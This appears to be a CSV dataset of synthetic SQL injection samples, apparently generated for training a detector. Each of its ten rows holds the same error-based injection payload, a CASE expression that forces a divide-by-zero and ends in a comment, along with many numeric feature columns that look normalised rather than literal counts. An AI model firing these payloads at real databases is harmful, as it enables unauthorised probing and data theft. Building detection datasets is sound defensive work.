id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000487,attack,error,select   (  case when   (  3539  =  8768  )   then 3539 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000078,4.356701598966192,131.32736206054688,51.23142623901367,6.933065414428711,54.20806121826172,9.849567413330078,58.416534423828125,9.819130897521973,0.3908923864364624,0.47166839241981506,0.1147100031375885,0.3823871314525604,0.08448518067598343,3.7641801834106445,0.15742196142673492,0.045240238308906555,1.279860258102417,0.1448773294687271,1.4204013347625732,-0.36874985694885254,4.39827299118042,4.170256614685059,-1.2848247289657593,0.956630289554596,0.7179146409034729,-0.3278793394565582,0.5154054164886475,-0.0547771155834198,-0.4539950489997864,-0.04550699144601822,0.6363295316696167,0.34806719422340393,0.43018966913223267,-0.675783097743988,1.143850564956665,0.8989332318305969,2.867490530014038,-0.08424831181764603,2.2493176460266113,-0.18234959244728088,0.03463182970881462,2.307352066040039,-0.1793588101863861,-0.019633490592241287,-0.5338225960731506,0.7505906820297241,0.3993002474308014,1.2192611694335938,1.24647855758667,0.9238449931144714,0.7818402647972107,1.1120625734329224,-0.2927914559841156,-0.1848238855600357,-0.4367949664592743,0.21438376605510712,0.1829734444618225,0.12647050619125366,-0.4554387331008911,0.32043322920799255,-0.3380154073238373,0.7601206302642822,-0.7172760367393494,-0.20239464938640594,1.4374935626983643,-0.7209188342094421,-0.32458534836769104,-0.12070460617542267,0.16656732559204102,0.058587491512298584,0.011302361264824867,0.05506709963083267,0.3396446406841278,-0.21909795701503754,0.025288164615631104,0.07586212456226349,0.08665229380130768,0.18961626291275024,0.016357388347387314,-0.9800843000411987,-0.2393110990524292,8.08329963684082,-0.15095041692256927,0.2183375209569931,0.06824204325675964,-0.21249136328697205,0.32865315675735474,0.07186654210090637,0.718207836151123
GAN_000488,attack,error,select   (  case when   (  9393  =  5530  )   then 9393 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000030,5.7721644520017374,131.80654907226562,51.88397216796875,4.47465705871582,53.96257400512695,11.944989204406738,59.8312873840332,8.986886024475098,0.2626860737800598,0.5060561299324036,0.11750348657369614,0.3877250850200653,0.08198954910039902,3.687511444091797,0.20578904449939728,0.09080706536769867,1.1386632919311523,0.2706364095211029,1.3762338161468506,-0.4544984996318817,4.3507161140441895,4.463863849639893,-1.2100805044174194,1.1731435060501099,0.6817055940628052,-0.7241171598434448,0.42826467752456665,-0.28742244839668274,-0.5008255839347839,0.08750944584608078,0.6301841735839844,0.5751872062683105,0.14151044189929962,-0.7476136684417725,1.2705072164535522,0.9425243139266968,2.577899217605591,-0.1857297718524933,2.4418089389801025,-0.41499316692352295,0.049900177866220474,1.963311791419983,-0.22536906599998474,0.06784334033727646,-0.9136659502983093,0.6870847940444946,0.8866531252861023,1.2843793630599976,1.4309909343719482,0.9087444543838501,0.7553253173828125,1.19325590133667,-0.5128535032272339,0.008034780621528625,-0.8317515254020691,0.5877365469932556,-0.053825974464416504,0.08752930909395218,-0.2682357132434845,0.3317582905292511,-0.5535038113594055,0.8687201738357544,-1.4281277656555176,0.039048150181770325,1.7087469100952148,-1.0034310817718506,-0.3492060601711273,-0.4743669629096985,0.44857463240623474,0.05673839896917343,0.017319539561867714,0.22751404345035553,0.326409250497818,-0.22671106457710266,0.04337725415825844,0.06753010302782059,-0.12426508963108063,0.20531225204467773,0.35241425037384033,-1.32062566280365,-0.18385028839111328,8.618849754333496,-0.33403122425079346,0.20869620144367218,0.04784180968999863,-0.14408859610557556,0.20583060383796692,-0.10147052258253098,0.3749358654022217
GAN_000489,attack,error,select   (  case when   (  6804  =  7050  )   then 6804 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000065,2.8878634434016903,133.77880859375,50.25349426269531,16.479589462280273,52.11216354370117,5.135965824127197,53.564029693603516,12.018719673156738,0.8555202484130859,0.42049142718315125,0.1325455904006958,0.3798271119594574,0.0899219885468483,3.7371537685394287,0.30318883061408997,0.07305750250816345,1.0510607957839966,0.09012562036514282,0.9446355104446411,-0.14544185996055603,4.260579586029053,4.374105930328369,1.0373319387435913,0.3888609707355499,0.9350529909133911,-0.22268466651439667,0.19042399525642395,-0.09925949573516846,-0.1324709802865982,0.3326757252216339,0.3327082395553589,0.3403736650943756,0.5449223518371582,-0.20850418508052826,0.8814328908920288,1.020177960395813,2.92919921875,-0.027604762464761734,1.9482526779174805,-0.1531774252653122,0.04718751832842827,1.7788563966751099,-0.1645040512084961,0.1033065989613533,-0.33583977818489075,0.24058577418327332,0.3117679953575134,0.8996745944023132,0.8822225332260132,0.7941354513168335,0.6674317121505737,0.8864249587059021,-0.2464710772037506,0.001760442741215229,-0.16409170627593994,0.3248549699783325,-0.05423964560031891,-0.032368287444114685,0.15987735986709595,0.2311578392982483,-0.30150675773620605,0.5150302052497864,-0.7708193063735962,-0.10342523455619812,1.1370431184768677,-0.2858169674873352,-0.08974070101976395,-0.05557328462600708,0.2390666902065277,-0.02112397737801075,0.073305644094944,-0.12441178411245346,0.05471235513687134,-0.2892070412635803,0.034742265939712524,0.022466447204351425,0.06953747570514679,0.1413009613752365,0.21566258370876312,-0.39824870228767395,-0.14349007606506348,6.988341331481934,-0.061670538038015366,0.05840732529759407,0.054715048521757126,0.17305351793766022,-0.01405584067106247,-0.03175480663776398,0.39677155017852783
GAN_000490,attack,error,select   (  case when   (  4568  =  4241  )   then 4568 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000027,4.097728428683887,133.24063110351562,49.84396743774414,10.591361045837402,53.455875396728516,8.396483421325684,59.500648498535156,9.775497436523438,0.8786284923553467,0.47950997948646545,0.1013224646449089,0.38680875301361084,0.08020137250423431,3.7495357990264893,0.20975789427757263,-0.007166082970798016,1.1793286800384521,0.1735924333333969,1.2401747703552246,-0.06895951926708221,4.476898670196533,4.218447208404541,-0.6646803021430969,0.30979934334754944,0.8650521039962769,-0.6695553064346313,0.5398867130279541,-0.33763745427131653,-0.39452236890792847,0.3505118787288666,0.5608822107315063,0.42722538113594055,0.10017258673906326,-0.3956730365753174,1.2231347560882568,0.8872567415237427,2.598897695541382,-0.07725054770708084,2.2158052921295166,-0.14565813541412354,0.04717554152011871,2.1034109592437744,-0.28399109840393066,0.11227830499410629,-0.3300390839576721,0.5749098062515259,0.5344033241271973,0.9438232779502869,1.188030481338501,0.9538469910621643,0.8158745765686035,1.1599626541137695,-0.18782709538936615,-0.060127224773168564,-0.5249435901641846,0.35485514998435974,-0.15762817859649658,-0.1499410718679428,-0.07754115760326385,0.1910293847322464,-0.2932092845439911,0.8232913613319397,-0.9744318127632141,-0.10430359095335007,1.4934273958206177,-0.5673147439956665,-0.27128925919532776,-0.2615726590156555,0.23175600171089172,-0.03385232761502266,-0.06429760903120041,-0.07727854698896408,0.38619518280029297,-0.6160401105880737,0.03547878563404083,0.04080567508935928,-0.05574668571352959,0.155801460146904,0.4901156425476074,-0.8983573913574219,0.0007640011608600616,9.061786651611328,-0.17379289865493774,0.03994510695338249,0.09813639521598816,-0.1679483950138092,0.3382495045661926,0.012793678790330887,0.6156346797943115
GAN_000491,attack,error,select   (  case when   (  4415  =  2051  )   then 4415 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000054,3.2873374894859255,133.3818817138672,50.66691589355469,10.624002456665039,51.69054412841797,6.5298357009887695,55.94792556762695,10.739181518554688,0.8664991855621338,0.4449382424354553,0.11868900060653687,0.3839403986930847,0.08970969170331955,3.706517219543457,0.10763400048017502,0.00665950495749712,1.097182273864746,0.056840065866708755,1.1911219358444214,-0.2290681153535843,4.277644634246826,4.057762145996094,0.9842562079429626,0.5808305144309998,0.8793047666549683,-0.6308878064155579,0.565631091594696,-0.03477604687213898,-0.3012675642967224,0.3647082448005676,0.3211200535297394,0.3369885981082916,0.7520785927772522,-0.32884037494659424,1.0012845993041992,0.966804563999176,2.995148181915283,-0.051763664931058884,2.088679552078247,-0.3316393792629242,0.031978655606508255,2.020042657852173,-0.2690480947494507,0.10112271457910538,-0.5090171098709106,0.7485190629959106,0.44105079770088196,1.0168490409851074,1.1710296869277954,0.8544420003890991,0.7681645154953003,0.978204607963562,-0.3192310333251953,0.1299823820590973,-0.22349047660827637,0.3689486086368561,-0.2983560264110565,-0.01615903154015541,-0.05310967564582825,0.19187970459461212,-0.2893074154853821,0.6622242331504822,-0.7397621870040894,-0.16035199165344238,1.249807357788086,-0.5630544424057007,-0.15310075879096985,-0.06995174288749695,0.2887226939201355,0.055742792785167694,0.13938704133033752,-0.1368022859096527,0.14694783091545105,-0.3471936583518982,0.029658084735274315,0.04354363679885864,0.07543714344501495,0.2132100909948349,0.3425585627555847,-0.49358779191970825,-0.18263110518455505,7.800464153289795,-0.11332721263170242,-0.04315057769417763,0.03250503912568092,0.025805914774537086,-0.07024097442626953,0.05913381278514862,0.36761587858200073
GAN_000492,attack,error,select   (  case when   (  9393  =  5530  )   then 9393 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000030,4.461162755377195,134.70083618164062,50.61661148071289,5.646924018859863,53.8745002746582,8.283693313598633,58.518802642822266,9.279173851013184,0.671105146408081,0.47031667828559875,0.10981448739767075,0.39504119753837585,0.07912538200616837,3.6860105991363525,0.04174690693616867,-0.035337913781404495,1.4399259090423584,0.14943146705627441,1.4620929956436157,-0.044636279344558716,4.3337836265563965,4.248960971832275,0.19144098460674286,0.5836213827133179,0.8978503942489624,-1.027748465538025,0.7427156567573547,-0.03617258369922638,-0.4774150550365448,0.3779922425746918,0.6506913900375366,0.3374885022640228,0.46900326013565063,-0.5046365857124329,1.2910526990890503,0.7849797010421753,2.919019937515259,-0.08732793480157852,2.246370315551758,-0.12344010174274445,0.04262318089604378,1.9553107023239136,-0.2863241732120514,0.058733850717544556,-0.4297901391983032,0.7173179984092712,0.30938082933425903,1.093543291091919,1.4086570739746094,1.1119937896728516,0.965890645980835,1.223723292350769,-0.23609457910060883,0.21462392807006836,-0.35516589879989624,0.34235885739326477,-0.14208737015724182,-0.05395541340112686,-0.19149211049079895,-0.0735493004322052,-0.2023390233516693,0.8899810910224915,-0.9644684791564941,-0.29021766781806946,1.479341983795166,-0.7080886363983154,-0.2117498815059662,-0.48957663774490356,0.21855264902114868,0.12752538919448853,0.01695379428565502,0.14538641273975372,0.5182795524597168,-0.6151889562606812,0.02512543275952339,0.03309024125337601,0.03469021990895271,0.16923850774765015,0.6415318250656128,-0.723716139793396,-0.10832441598176956,8.965821266174316,-0.24826335906982422,0.1855737268924713,0.05966676026582718,-0.22424587607383728,0.21815955638885498,0.11083655804395676,0.39035463333129883
GAN_000493,attack,error,select   (  case when   (  4415  =  2051  )   then 4415 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000054,4.7849063421945495,133.19309997558594,50.84539031982422,6.630587577819824,53.86293411254883,8.379372596740723,60.13927459716797,9.23060131072998,0.5705314874649048,0.4649755358695984,0.11572309583425522,0.39133307337760925,0.07832611352205276,3.707242250442505,0.3005520701408386,0.03295131027698517,1.2981880903244019,0.14385251700878143,1.490476369857788,-0.1890888661146164,4.330099105834961,4.217766284942627,-0.08255870640277863,0.7048865556716919,0.9099808931350708,-0.9275323152542114,0.6197550892829895,-0.0792078971862793,-0.500910222530365,0.5375192761421204,0.7412154078483582,0.4810630977153778,0.30275797843933105,-0.4934558868408203,1.3075995445251465,0.8257860541343689,2.6792454719543457,-0.12742464244365692,2.267695665359497,0.025468964129686356,0.047795653343200684,2.1075148582458496,-0.25424879789352417,0.0685126855969429,-0.48369354009628296,0.6235606074333191,0.3959614336490631,1.2009665966033936,1.363775610923767,1.109084963798523,0.9381147623062134,1.2891477346420288,-0.3565521240234375,0.18116022646427155,-0.5669809579849243,0.4792374074459076,-0.06840769201517105,0.013593090698122978,0.026271406561136246,0.0835409015417099,-0.33817601203918457,0.9663812518119812,-1.1716477870941162,-0.2363055944442749,1.5451083183288574,-0.7747955322265625,-0.3275335729122162,-0.30771297216415405,0.25740450620651245,0.18079572916030884,-0.09630504250526428,0.2572125792503357,0.5446569919586182,-0.579625129699707,0.03898174315690994,0.02842871844768524,0.007322180084884167,0.1665046215057373,0.7035572528839111,-0.8242104053497314,-0.0002147294580936432,8.632716178894043,-0.26522475481033325,0.19181771576404572,0.0385705828666687,-0.2090320885181427,0.3112676739692688,0.11250149458646774,0.6044493317604065
GAN_000494,attack,error,select   (  case when   (  4415  =  2051  )   then 4415 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000054,3.111715330987349,136.21420288085938,48.853363037109375,11.483260154724121,52.56854248046875,6.19951057434082,54.2283821105957,11.751709938049316,0.7320658564567566,0.44914036989212036,0.14233405888080597,0.38476648926734924,0.09599266201257706,3.702897310256958,0.18688857555389404,-0.0002162857708754018,1.2367335557937622,0.04882311075925827,1.134461760520935,0.031778864562511444,4.22990608215332,4.303725719451904,1.6057064533233643,0.6393759250640869,0.8549087643623352,-0.24220715463161469,0.3542529344558716,0.039429180324077606,-0.2908996045589447,0.08455544710159302,0.12572896480560303,0.23942837119102478,0.7930718660354614,-0.5428298115730286,0.881043016910553,0.9679561257362366,3.1675028800964355,-0.016695495694875717,1.978130578994751,-0.30928224325180054,0.06470739096403122,1.8011265993118286,-0.17306207120418549,0.012041508220136166,-0.38282811641693115,0.5556144714355469,0.4428305923938751,0.8635192513465881,0.9898393154144287,0.8237369060516357,0.7592736482620239,0.9213389754295349,-0.29793405532836914,0.2303716391324997,-0.1880929172039032,0.1982877552509308,-0.12051675468683243,-0.13162697851657867,-0.17876160144805908,0.11909851431846619,-0.2194719910621643,0.47108492255210876,-0.5729433298110962,-0.16101232171058655,1.199858546257019,-0.30461835861206055,0.009973311796784401,0.036185070872306824,0.3035597503185272,-0.015197057276964188,0.11153292655944824,-0.17157979309558868,0.035888247191905975,-0.04230405390262604,0.008279439993202686,0.02919362671673298,0.1937515288591385,0.16121478378772736,0.1582970917224884,-0.49219653010368347,-0.3789125382900238,7.242790699005127,-0.08503951877355576,0.06050145998597145,0.10219422727823257,0.13121604919433594,-0.03751037269830704,-0.0021673468872904778,0.4573155343532562
GAN_000495,attack,error,select   (  case when   (  1812  =  2446  )   then 1812 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000046,3.34439781704393,134.23513793945312,48.68849563598633,16.124189376831055,51.35047149658203,5.644354820251465,53.89067840576172,11.762944221496582,0.8699711561203003,0.45236557722091675,0.130215123295784,0.3845248222351074,0.09228470921516418,3.714694023132324,0.33195456862449646,0.05848151817917824,1.076124668121338,0.10743627697229385,1.0678714513778687,-0.09549275785684586,4.309691905975342,4.291108131408691,1.1069896221160889,0.2541952133178711,0.8882458209991455,-0.4097408950328827,0.30640965700149536,-0.3369787037372589,-0.09146926552057266,0.24693213403224945,0.11825944483280182,0.43913137912750244,0.6832576990127563,-0.41378462314605713,0.9627833366394043,1.0333831310272217,2.8243954181671143,-0.06756149977445602,2.010874032974243,-0.2862258553504944,0.05749509111046791,1.6266731023788452,-0.22104701399803162,0.11998516321182251,-0.40565961599349976,0.23140162229537964,0.4189402759075165,0.762790322303772,0.9491463303565979,0.8012925386428833,0.7134622931480408,0.8684671521186829,-0.18612515926361084,-0.022205684334039688,-0.35327938199043274,0.4732309877872467,-0.33376047015190125,0.07034341990947723,0.022182300686836243,0.3349383771419525,-0.3027285933494568,0.7255660891532898,-1.0583494901657104,-0.13228456676006317,1.190390944480896,-0.37116745114326477,-0.11713574081659317,-0.30537599325180054,0.20452624559402466,-0.03017365373671055,0.09002349525690079,-0.26276400685310364,0.12303310632705688,-0.4002268314361572,0.0349959060549736,0.04561496898531914,-0.09378291666507721,0.1649152785539627,0.41244280338287354,-0.26224851608276367,-0.10014868527650833,7.681308746337891,-0.09677305072546005,-0.2271421253681183,0.06330380588769913,0.138938307762146,-0.03735950589179993,-0.2658482491970062,0.4416486918926239
GAN_000496,attack,error,select   (  case when   (  7997  =  1543  )   then 7997 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000021,3.9785647260452897,133.5491180419922,48.72955322265625,9.740826606750488,53.707889556884766,9.609246253967285,56.73860549926758,10.167898178100586,0.5023421049118042,0.4550096094608307,0.12554635107517242,0.383853018283844,0.08313135802745819,3.734081983566284,0.2678474485874176,0.07065264135599136,1.3849856853485107,0.18824443221092224,1.352519154548645,-0.22914788126945496,4.382292747497559,4.443735122680664,-0.22354371845722198,0.6183714270591736,0.8969113230705261,-0.32545456290245056,0.6437807083129883,-0.20957091450691223,-0.29268279671669006,0.3671329915523529,0.5640450119972229,0.45035088062286377,0.25881528854370117,-0.6254442930221558,1.1476378440856934,0.9216400980949402,2.7327589988708496,-0.1270461231470108,2.2309484481811523,0.05765463784337044,0.07515773177146912,1.841474175453186,-0.06922624260187149,0.03338504582643509,-0.2967616319656372,0.2713317573070526,0.3678602874279022,1.0433202981948853,1.1511799097061157,0.97672438621521,0.8728960156440735,1.1680659055709839,-0.3229122757911682,0.12953007221221924,-0.4622403681278229,0.33480697870254517,0.26759129762649536,-0.013055820018053055,0.0951642096042633,-0.018301168456673622,-0.39504140615463257,0.8020621538162231,-0.9955787658691406,-0.08387499302625656,1.4367741346359253,-0.6085270047187805,-0.15082821249961853,-0.2683051824569702,0.2122870534658432,-0.003794413059949875,-0.12775738537311554,-0.007765693124383688,0.2846359312534332,-0.4497211277484894,0.015661191195249557,0.026969701051712036,0.014128047041594982,0.19700592756271362,0.22298301756381989,-0.8396553993225098,-0.20157155394554138,7.67559289932251,-0.133343905210495,0.07798309624195099,0.08219949901103973,-0.11335394531488419,0.4806576669216156,-0.09434863179922104,0.5711781978607178
